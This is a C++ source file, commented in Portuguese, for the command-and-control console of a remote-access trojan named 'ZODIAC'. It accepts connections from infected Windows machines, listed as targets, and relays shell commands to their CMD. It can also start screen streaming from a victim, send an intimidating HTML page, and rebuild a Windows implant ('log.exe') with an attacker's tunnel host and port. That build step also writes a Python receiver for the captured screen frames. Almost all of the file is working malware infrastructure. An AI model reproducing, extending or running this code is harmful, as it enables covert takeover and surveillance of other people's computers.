#include <iostream>   
#include <string>     
#include <vector>     
#include <cstring>    
#include <sys/socket.h> 
#include <netinet/in.h> 
#include <arpa/inet.h>  
#include <unistd.h>     
#include <csignal>    
#include <sys/select.h> 
#include <iomanip>    
#include <fstream>    
#include <sstream>

using namespace std;

struct Alvo {
    int id;       
    string ip;    
};

void desenhar_menu_zodiac();
void fechar_fortaleza(int sinal);

// NOVA PALETA DE CORES ATUALIZADA (ESTILO MATRIX / CYBERPUNK)
const string RESET     = "\033[0m";
const string GREEN     = "\033[32m\033[1m"; // Verde Matrix brilhante
const string CYAN      = "\033[36m\033[1m"; // Azul Cyber tecnológico
const string RED       = "\033[31m\033[1m"; // Vermelho Alerta
const string YELLOW    = "\033[33m\033[1m"; // Amarelo Aviso
const string WHITE     = "\033[37m\033[1m"; // Branco Puro
const string PISCANDO  = "\033[5m";         // Efeito piscante para o Operador

int socket_principal;      
vector<Alvo> lista_alvos;  
int main() {
    signal(SIGINT, fechar_fortaleza);
    signal(SIGPIPE, SIG_IGN); 
    
    int PORTA_ARMADILHA  = 8081;          
    socket_principal = socket(AF_INET, SOCK_STREAM, 0);
    
    int op = 1;
    setsockopt(socket_principal, SOL_SOCKET, SO_REUSEADDR, &op, sizeof(op));

    struct sockaddr_in endereco;
    memset(&endereco, 0, sizeof(endereco));
    endereco.sin_family = AF_INET;
    endereco.sin_addr.s_addr = INADDR_ANY; 
    endereco.sin_port = htons(PORTA_ARMADILHA);

    if (bind(socket_principal, (struct sockaddr*)&endereco, sizeof(endereco)) < 0) {
        cout << RED << "[!] ERRO CRÍTICO: A porta " << PORTA_ARMADILHA << " já está ocupada por outro processo." << RESET << endl;
        return 1;
    }

    listen(socket_principal, 50); 
    desenhar_menu_zodiac();

    fd_set conjunto_leitura; 

    while (true) {
        FD_ZERO(&conjunto_leitura);
        FD_SET(socket_principal, &conjunto_leitura); 
        FD_SET(STDIN_FILENO, &conjunto_leitura);      

        int max_fd = socket_principal;
        for (const auto& alvo : lista_alvos) {
            FD_SET(alvo.id, &conjunto_leitura);
            if (alvo.id > max_fd) max_fd = alvo.id;
        }

        int atividade = select(max_fd + 1, &conjunto_leitura, NULL, NULL, NULL);
        if (atividade < 0) continue;

        if (FD_ISSET(socket_principal, &conjunto_leitura)) {
            struct sockaddr_in cliente;
            socklen_t tamanho_addr = sizeof(cliente);
            int novo_socket = accept(socket_principal, (struct sockaddr*)&cliente, &tamanho_addr);

            if (novo_socket >= 0) {
                Alvo novo_alvo;
                novo_alvo.id = novo_socket;
                novo_alvo.ip = inet_ntoa(cliente.sin_addr);
                lista_alvos.push_back(novo_alvo); 

                cout << GREEN << "\n[🛰️ ALVO INTERCEPTADO] ➔ Chassi linkado no terminal: " << YELLOW << novo_alvo.ip << WHITE << " (ID: " << novo_alvo.id << ")" << RESET << endl;
                cout << CYAN << "ZODIAC_NULL_CONSOLE_> " << flush;
                
                string welcome = "HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=UTF-8\r\n\r\n[CONEXÃO MONITORADA PELO NÚCLEO SUPREMO ZODÍACO]\n";
                send(novo_socket, welcome.c_str(), welcome.length(), 0);
            }
        }
        if (FD_ISSET(STDIN_FILENO, &conjunto_leitura)) {
            string entrada;
            getline(cin, entrada);

            if (entrada == "clear") {
                system("clear");
                desenhar_menu_zodiac();
            }
            else if (entrada == "exit:all") {
                cout << RED << "\n[-] [FECHAMENTO] Executando comando de ejeção global em lote..." << RESET << endl;
                for (const auto& alvo : lista_alvos) close(alvo.id);
                close(socket_principal);
                cout << GREEN << "[+] Central desligada com sucesso de forma limpa." << RESET << endl;
                exit(0);
            }
            else if (entrada == "list") {
                cout << GREEN << "\n+-------------------------------------------------------+" << RESET << endl;
                cout << CYAN << "  |             TABELA DE CHASSIS ATIVOS (MATRIX)         |" << RESET << endl;
                cout << GREEN << "+----------+-------------------+------------------------+" << endl;
                cout << YELLOW << "  | INDEX ID | ENDEREÇO IP REAL  | STATUS DO MONITOR      |" << endl;
                cout << GREEN << "+----------+-------------------+------------------------+" << RESET << endl;
                if (lista_alvos.empty()) {
                    cout << WHITE << "  |      [ NENHUM INTRUSO PRESO NA ARMADILHA ATUALMENTE ]        |" << RESET << endl;
                } else {
                    for (const auto& alvo : lista_alvos) {
                        cout << WHITE << "  | " << setw(8) << alvo.id 
                             << " | " << setw(17) << alvo.ip 
                             << " | " << GREEN << "LINHA MONITORADA 🟢 " << WHITE << " |" << RESET << endl;
                    }
                }
                cout << GREEN << "+-------------------------------------------------------+\n" << RESET << endl;
            }
            else if (!entrada.empty()) {
                size_t pos_dois_pontos = entrada.find(":");
                if (pos_dois_pontos != string::npos) {
                    string prefixo = entrada.substr(0, pos_dois_pontos);
                    string resto = entrada.substr(pos_dois_pontos + 1);

                    // ⚡ COMPILADOR DE AUTOMATIZAÇÃO DUPLA (C++ Windows e Script Python)
                    if (prefixo == "build" && resto.substr(0, 4) == "exe:") {
                        string dados_tuna = resto.substr(4);
                        size_t divisor = dados_tuna.find(":");
                        
                        if (divisor != string::npos) {
                            string novo_host = dados_tuna.substr(0, divisor);
                            string nova_porta = dados_tuna.substr(divisor + 1);

                            cout << YELLOW << "\n[*] [DUAL-BUILDER] Injetando rotas Bore -> HOST: " << novo_host << " | PORTA: " << nova_porta << RESET << endl;
                            
                            // Ajusta o código C++ do Windows automaticamente
                            ifstream arquivo_leitura("/home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp");
                            stringstream buffer_texto;
                            if (arquivo_leitura.is_open()) {
                                string linha;
                                while (getline(arquivo_leitura, linha)) {
                                    if (linha.find("string IP_CENTRAL") != string::npos) {
                                        buffer_texto << "    string IP_CENTRAL = \"" << novo_host << "\";\n";
                                    } else if (linha.find("string PORTA_CENTRAL") != string::npos) {
                                        buffer_texto << "    string PORTA_CENTRAL = \"" << nova_porta << "\";\n";
                                    } else {
                                        buffer_texto << linha << "\n";
                                    }
                                }
                                arquivo_leitura.close();
                                ofstream arquivo_escrita("/home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp");
                                arquivo_escrita << buffer_texto.str();
                                arquivo_escrita.close();
                            }

                            // Fábrica o visualizador.py com o seu receptor nativo do OpenCV
                            ofstream arquivo_py("/home/gabriel/POISON/ZODIAC-POISON_TAR/visualizador.py");
                            if (arquivo_py.is_open()) {
                                arquivo_py << "import socket\nimport struct\nimport cv2\nimport numpy as np\n\n"
                                           << "PORTA_LOCAL = 8081\n\n"
                                           << "def iniciar_central_video():\n"
                                           << "    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                                           << "    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n"
                                           << "    server.bind(('0.0.0.0', PORTA_LOCAL))\n"
                                           << "    server.listen(1)\n"
                                           << "    print(f'\\033[32m\\033[1m[🟢 TRANSMISSÃO ATIVA] via {novo_host}:{nova_porta} ➔ Local: {PORTA_LOCAL}\\033[0m')\n"
                                           << "    conn, addr = server.accept()\n"
                                           << "    try:\n"
                                           << "        banner = conn.recv(1024).decode(errors=\"ignore\")\n"
                                           << "        print(banner)\n"
                                           << "        conn.send(b\"screen\\n\")\n"
                                           << "        cv2.namedWindow('Zodiac Stream - Janela Virtual (Bore)', cv2.WINDOW_NORMAL)\n"
                                           << "        while True:\n"
                                           << "            tamanho_bytes = conn.recv(4)\n"
                                           << "            if not tamanho_bytes or len(tamanho_bytes) < 4: break\n"
                                           << "            tamanho_total = struct.unpack(\"I\", tamanho_bytes)[0]\n"
                                           << "            dados_imagem = b\"\"\n"
                                           << "            while len(dados_imagem) < tamanho_total:\n"
                                           << "                bloco = conn.recv(tamanho_total - len(dados_imagem))\n"
                                           << "                if not bloco: break\n"
                                           << "                dados_imagem += bloco\n"
                                           << "            if len(dados_imagem) < tamanho_total: break\n"
                                           << "            ajuste_np = np.frombuffer(dados_imagem, dtype=np.uint8)\n"
                                           << "            frame_visual = cv2.imdecode(ajuste_np, cv2.IMREAD_COLOR)\n"
                                           << "            if frame_visual is not None:\n"
                                           << "                cv2.imshow('Zodiac Stream - Janela Virtual (Bore)', frame_visual)\n"
                                           << "            if cv2.waitKey(1) & 0xFF == ord('q'): break\n"
                                           << "    except Exception as e: print(e)\n"
                                           << "    finally:\n"
                                           << "        cv2.destroyAllWindows(); conn.close(); server.close()\n"
                                           << "if __name__ == '__main__':\n"
                                           << "    iniciar_central_video()\n";
                                arquivo_py.close();
                                cout << GREEN << "[+] [AUTO-GEN] Script 'visualizador.py' calibrado para a porta local." << RESET << endl;
                            }

                            cout << CYAN << "[*] [MIN-GW] Compilando executável cruzado log.exe..." << RESET << endl;
                            int status = system("x86_64-w64-mingw32-g++ -O3 /home/gabriel/POISON/ZODIAC-POISON_TAR/windows_src.cpp -o /home/gabriel/POISON/ZODIAC-POISON_TAR/log.exe -lws2_32 -lgdiplus -lwininet -static 2>/dev/null");
                            
                            if (status == 0) {
                                cout << GREEN << "[🎯 CORE BUILD SUCESS] log.exe fabricado e visualizador.py gerado com sucesso!" << RESET << endl;
                            } else {
                                cout << RED << "[x] Erro na compilação do MinGW. Verifique as dependências." << RESET << endl;
                            }
                        }
                    }
                    else if (prefixo == "kick" || prefixo == "strike") {
                        size_t sub_dois_pontos = resto.find(":");
                        string id_str = (sub_dois_pontos == string::npos) ? resto : resto.substr(0, sub_dois_pontos);
                        bool linkar_arquivo_local = (sub_dois_pontos != string::npos && resto.substr(sub_dois_pontos + 1) == "file");

                        try {
                            int id_alvo = stoi(id_str);
                            bool achou = false;

                            for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ++it) {
                                if (it->id == id_alvo) {
                                    achou = true;
                                    
                                    if (linkar_arquivo_local) {
                                        ifstream arquivo_local("/home/gabriel/POISON/ZODIAC-POISON_TAR/aviso.txt");
                                        string linhas_html_customizadas = "";
                                        
                                        if (arquivo_local.is_open()) {
                                            string linha;
                                            while (getline(arquivo_local, linha)) {
                                                linhas_html_customizadas += "<p>" + linha + "</p>";
                                            }
                                            arquivo_local.close();
                                        } else {
                                            linhas_html_customizadas = "<p>AVISO SUPREMO ZODIACO: Linha encerra por NULL.</p>";
                                        }

                                        string html_content = 
                                            "<!DOCTYPE html><html><head><meta charset='utf-8'><title>ZODIAC ENGINE</title>"
                                            "<style>"
                                            "body { background-color: #0d0d0d; color: #00ffcc; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }"
                                            ".box { text-align: center; background: rgba(20, 20, 20, 0.9); border: 2px solid #ff0055; padding: 40px; box-shadow: 0 0 25px #ff0055, inset 0 0 15px rgba(255,0,85,0.3); border-radius: 8px; max-width: 600px; }"
                                            "h1 { font-size: 36px; color: #ff0055; text-transform: uppercase; letter-spacing: 4px; margin-bottom: 20px; text-shadow: 0 0 10px #ff0055; }"
                                            "p { font-size: 16px; color: #d9d9d9; line-height: 1.6; }"
                                            "</style></head><body>"
                                            "<div class='box'>"
                                            "<h1>[ ZODIAC INTERCEPT ]</h1>" + linhas_html_customizadas +
                                            "<p style='color:#ff0055; font-size:12px; margin-top:25px;'>⚡ OPERADOR: NULL ⚡</p>"
                                            "</div></body></html>";

                                        string payload_html = 
                                            "HTTP/1.1 200 OK\r\n"
                                            "Content-Type: text/html; charset=UTF-8\r\n"
                                            "Content-Length: " + to_string(html_content.length()) + "\r\n"
                                            "Connection: close\r\n\r\n" + html_content;
                                        
                                        send(id_alvo, payload_html.c_str(), payload_html.length(), 0);
                                    }

                                    if (prefixo == "kick") {
                                        cout << RED << "\n[-] [EJEÇÃO] Expulsando o ID " << id_alvo << " do barramento." << RESET << endl;
                                        close(id_alvo);
                                    } else {
                                        cout << RED << "\n🔥 [ZODIAC STRIKE] -> Acionando canal de streaming de tela no ID: " << id_alvo << RESET << endl;
                                        string carga = "screen\n"; 
                                        send(id_alvo, carga.c_str(), carga.length(), 0);
                                    }
                                    lista_alvos.erase(it);
                                    break;
                                }
                            }
                            if (!achou) cout << RED << "[!] ID não encontrado na tabela." << RESET << endl;
                        } 
                        catch (...) {
                            cout << RED << "[!] Sintaxe incorreta. Use 'kick:ID', 'kick:ID:file' ou 'strike:ID'" << RESET << endl;
                        }
                    }
                    else {
                        // Envio direto de strings de comandos de texto via buffer
                        try {
                            int id_alvo = stoi(prefixo);
                            string msg_real = resto + "\n";
                            send(id_alvo, msg_real.c_str(), msg_real.length(), 0);
                            cout << CYAN << "[+] Linha de texto direcionada ao ID: " << id_alvo << RESET << endl;
                        } catch (...) {
                            cout << RED << "[!] Comando ou formato de ID inválido." << RESET << endl;
                        }
                    }
                }
            }
            cout << CYAN << "ZODIAC_NULL_CONSOLE_> " << flush;
        }

        // Monitor de Rede: Lê as respostas de shell do executável do Windows ou detecta desconexões
        for (auto it = lista_alvos.begin(); it != lista_alvos.end(); ) {
            if (FD_ISSET(it->id, &conjunto_leitura)) {
                char buf[2048] = {0}; 
                int bytes_lidos = recv(it->id, buf, sizeof(buf) - 1, 0);
                if (bytes_lidos <= 0) {
                    cout << RED << "\n[-] [DESCONEXÃO] O alvo do ID " << it->id << " quebrou a linha e fugiu." << RESET << endl;
                    close(it->id);
                    it = lista_alvos.erase(it);
                } else {
                    // Imprime a resposta de texto recebida do prompt do Windows de forma limpa na tela
                    cout << "\n" << WHITE << buf << RESET << endl;
                    ++it;
                }
                cout << CYAN << "ZODIAC_NULL_CONSOLE_> " << flush;
            } else {
                ++it;
            }
        }
    }
    return 0;
}

// O PALÁCIO DO OPERADOR NULL RESTAURADO E MAIS BONITO COM CORES MATRIX NEON
void desenhar_menu_zodiac() {
    cout << GREEN << "=================================================================================" << RESET << endl;
    cout << CYAN << " ______  ____  _____   _    ____ " << endl;
    cout << CYAN << "|_  _  |/ __ \\|  __ \\ | |  / ___|" << endl;
    cout << CYAN << "  / /  | /  \\ | |  \\ \\| | | |      " << RED << "   [ OPERADOR SUPREMO ]" << endl;
    cout << CYAN << " / /__ | \\__/ | |__/ /| | | |___   " << WHITE << "       ⚡ " << RED << PISCANDO << "N U L L" << RESET << WHITE << " ⚡" << endl;
    cout << CYAN << "|_____| \\____/|_____/ |_|  \\____|  " << GREEN << "   (⚙️ MATRIX CENTRAL CORE v12.0 ⚙️)" << endl;
    cout << GREEN << "=================================================================================" << RESET << endl;
    cout << GREEN << "   [+] Basicos:  'list' (tabela)   | 'clear' (limpar) | 'exit:all' (desligar central)" << RESET << endl;
    cout << CYAN << "   [*] Controle: 'kick:ID:file'    | 'ID:comando' (Injeta comandos de shell no CMD)" << RESET << endl;
    cout << YELLOW << "   [⚡] INJETOR BORE: 'build:exe:host:porta' (Fabrica o log.exe e o script visualizador.py)" << RESET << endl;
    cout << GREEN << "=================================================================================" << RESET << endl;
    cout << YELLOW << "   [*] Hub do Zodíaco operacional. Aguardando transmissões...\n" << RESET << endl;
}

void fechar_fortaleza(int sinal) {
    for (const auto& alvo : lista_alvos) close(alvo.id);
    close(socket_principal);
    exit(sinal);
}
